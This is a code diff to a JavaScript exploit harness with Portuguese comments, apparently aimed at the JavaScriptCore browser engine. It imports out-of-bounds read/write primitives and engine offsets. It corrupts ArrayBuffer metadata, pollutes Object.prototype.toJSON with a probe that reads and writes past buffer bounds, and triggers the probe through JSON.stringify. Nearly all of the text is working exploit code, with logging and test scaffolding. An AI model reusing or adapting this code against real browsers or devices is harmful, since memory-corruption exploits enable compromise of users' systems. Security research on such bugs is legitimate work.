@@ -2,57 +2,58 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
 import {
-    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
-    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
+    triggerOOB_primitive,
+    oob_array_buffer_real, // Importada para uso interno
+    oob_dataview_real,
+    oob_write_absolute,
+    oob_read_absolute,
+    clearOOBEnvironment
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Contador global, embora a toJSON_AttemptWriteToThis não deva usá-lo.
 export let current_toJSON_call_count_for_TypeError_test = 0;
 
 // Esta é a toJSON que tentará escrever e ler em 'this'
 export function toJSON_AttemptWriteToThis() {
     // Não usar current_toJSON_call_count_for_TypeError_test++ aqui.
     // Não usar logS3 ou document.title aqui para evitar TypeError conhecido.
-    
+
     let result_payload = {
         toJSON_executed: "toJSON_AttemptWriteToThis",
         this_type: "N/A",
-        this_byteLength_prop: "N/A", // Adicionado para logar o byteLength percebido
+        this_byteLength_prop: "N/A",
         dataview_created: false,
         written_value: null,
         read_back_value: null,
         write_match: false,
         error_in_toJSON: null,
-        oob_read_attempt_val: "N/A", // Para teste de leitura OOB se o tamanho for inflado
-        oob_write_attempt_status: "N/A" // Para teste de escrita OOB
+        oob_read_attempt_val: "N/A",
+        oob_write_attempt_status: "N/A"
     };
 
     try {
         result_payload.this_type = Object.prototype.toString.call(this);
-        result_payload.this_byteLength_prop = this.byteLength; // Tenta ler o byteLength
+        result_payload.this_byteLength_prop = this.byteLength;
 
         if (this instanceof ArrayBuffer) {
-            // Usar o this.byteLength que acabamos de ler para verificações
-            let current_this_byteLength = result_payload.this_byteLength_prop; 
+            let current_this_byteLength = result_payload.this_byteLength_prop;
             if (typeof current_this_byteLength === 'number' && current_this_byteLength >= 4) {
                 try {
-                    let dv = new DataView(this); // Usa 'this' diretamente
+                    let dv = new DataView(this);
                     result_payload.dataview_created = true;
-                    
+
                     const val_to_write = 0x41424344;
-                    dv.setUint32(0, val_to_write, true); 
+                    dv.setUint32(0, val_to_write, true);
                     result_payload.written_value = toHex(val_to_write);
-                    
+
                     result_payload.read_back_value = toHex(dv.getUint32(0, true));
-                    
+
                     if (dv.getUint32(0, true) === val_to_write) {
                         result_payload.write_match = true;
                     }
 
-                    // Tentativa de Leitura OOB se o byteLength for > 64 (exemplo)
-                    const original_expected_size = 64; // Tamanho original do 'victim_ab' ou do 'oob_array_buffer_real' antes de inflar
-                    const oob_read_offset = original_expected_size + 8; 
+                    const original_expected_size = 64; // Ajuste se oob_array_buffer_real tiver outro tamanho base
+                    const oob_read_offset = original_expected_size + 8;
                     if (current_this_byteLength > oob_read_offset + 3) {
                         try {
                             result_payload.oob_read_attempt_val = toHex(dv.getUint32(oob_read_offset, true));
@@ -76,39 +77,38 @@ export function toJSON_AttemptWriteToThis() {
         result_payload.error_in_toJSON = `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}`;
         result_payload.this_byteLength_prop = `Error accessing: ${e_main.message}`;
     }
-    
+
     return result_payload;
 }
 
-
-export async function executeFocusedTestForTypeError( // Mantendo nome por estrutura, mas o foco agora é exploração
+export async function executeFocusedTestForTypeError(
     testDescription,
-    toJSONFunctionToUse, 
-    valueToWriteOOB,     // Para a corrupção inicial de metadados de oob_array_buffer_real
-    corruptionOffsetToTest, // Offset da corrupção inicial
-    bytesForInitialCorruption, // Bytes para a corrupção inicial
-    bufferToActuallyStringify // O buffer que será passado para JSON.stringify
+    toJSONFunctionToUse,
+    valueToWriteOOB,         // Para a corrupção inicial de metadados
+    corruptionOffsetToTest,  // Offset da corrupção inicial
+    bytesForInitialCorruption
+    // bufferToActuallyStringify // PARÂMETRO REMOVIDO
 ) {
-    const FNAME = `executeExploitAttempt<${testDescription}>`;
+    const FNAME = `executeExploitAttempt<${testDescription}>`; // Nome da função pode ser mais genérico agora
     logS3(`--- Iniciando Teste de Exploração: ${testDescription} ---`, "test", FNAME);
     logS3(`    Corrupção Inicial OOB: Valor=${typeof valueToWriteOOB === 'object' ? valueToWriteOOB.toString(true) : toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)} (${bytesForInitialCorruption}b)`, "info", FNAME);
-    logS3(`    Buffer a ser Stringificado: ${bufferToActuallyStringify === oob_array_buffer_real ? 'oob_array_buffer_real (auto-referência)' : 'outro buffer'}`, "info", FNAME);
     document.title = `Iniciando: ${testDescription}`;
 
-    current_toJSON_call_count_for_TypeError_test = 0; 
+    current_toJSON_call_count_for_TypeError_test = 0;
 
     const ppKey_val = 'toJSON';
 
-    // O setup do OOB é feito primeiro, antes de qualquer corrupção direcionada
-    await triggerOOB_primitive();
+    await triggerOOB_primitive(); // Configura o oob_array_buffer_real global
     if (!oob_array_buffer_real) {
         logS3("Falha OOB Setup.", "error", FNAME);
         document.title = "ERRO OOB Setup - " + FNAME;
         return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
     }
+    // oob_array_buffer_real está agora definido e acessível globalmente (no escopo do módulo)
+    logS3(`    Buffer a ser Stringificado: oob_array_buffer_real (após setup e corrupção inicial)`, "info", FNAME);
     document.title = "OOB OK - " + FNAME;
 
-    // Aplica a corrupção OOB INICIAL aos metadados do oob_array_buffer_real (ou onde for)
+
     if (corruptionOffsetToTest !== null && valueToWriteOOB !== null) {
         logS3(`CORRUPÇÃO INICIAL: ${typeof valueToWriteOOB === 'object' ? valueToWriteOOB.toString(true) : toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)} no oob_array_buffer_real`, "warn", FNAME);
         document.title = `Antes OOB Write Meta (${toHex(corruptionOffsetToTest)})`;
@@ -124,13 +124,13 @@ export async function executeFocusedTestForTypeError( // Mantendo nome por estru
         logS3("Nenhuma corrupção inicial de metadados OOB especificada.", "info", FNAME);
     }
     
-    stepReached = "apos_escrita_oob_inicial";
+    let stepReached = "apos_escrita_oob_inicial";
     document.title = `Após OOB Write Meta (${toHex(corruptionOffsetToTest)})`;
 
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
-    let stepReached = "antes_pp";
-    let potentiallyCrashed = true; 
+    // stepReached já foi definido acima
+    let potentiallyCrashed = true;
     let errorCaptured = null;
     let stringifyResult = null;
 
@@ -139,7 +139,7 @@ export async function executeFocusedTestForTypeError( // Mantendo nome por estru
         logS3(`Poluindo Object.prototype.${ppKey_val} com função de sondagem...`, "info", FNAME);
         document.title = `Aplicando PP Exploit`;
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSONFunctionToUse, // Deve ser toJSON_AttemptWriteToThis
+            value: toJSONFunctionToUse,
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
@@ -150,21 +150,21 @@ export async function executeFocusedTestForTypeError( // Mantendo nome por estru
         await PAUSE_S3(SHORT_PAUSE_S3);
 
         stepReached = "antes_stringify";
-        document.title = `Antes Stringify Target`;
-        logS3(`Chamando JSON.stringify no buffer alvo...`, "info", FNAME);
+        document.title = `Antes Stringify oob_array_buffer_real`;
+        logS3(`Chamando JSON.stringify no oob_array_buffer_real (potencialmente corrompido)...`, "info", FNAME);
         
         try {
-            // O buffer alvo é passado como parâmetro
-            stringifyResult = JSON.stringify(bufferToActuallyStringify); 
+            // Agora sempre stringifica o oob_array_buffer_real que foi configurado e possivelmente corrompido
+            stringifyResult = JSON.stringify(oob_array_buffer_real); 
             stepReached = `apos_stringify`;
             potentiallyCrashed = false; 
-            document.title = `Strfy Target OK`;
+            document.title = `Strfy oob_array_buffer_real OK`;
             logS3(`Resultado JSON.stringify: ${typeof stringifyResult === 'string' ? stringifyResult : JSON.stringify(stringifyResult)}`, "info", FNAME);
         } catch (e) {
             stepReached = `erro_stringify`;
             potentiallyCrashed = false; 
             errorCaptured = e;
-            document.title = `ERRO Strfy Target (${e.name})`;
+            document.title = `ERRO Strfy oob_array_buffer_real (${e.name})`;
             logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}.`, "critical", FNAME);
             if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
             console.error(`JSON.stringify ERROR (${testDescription}):`, e);
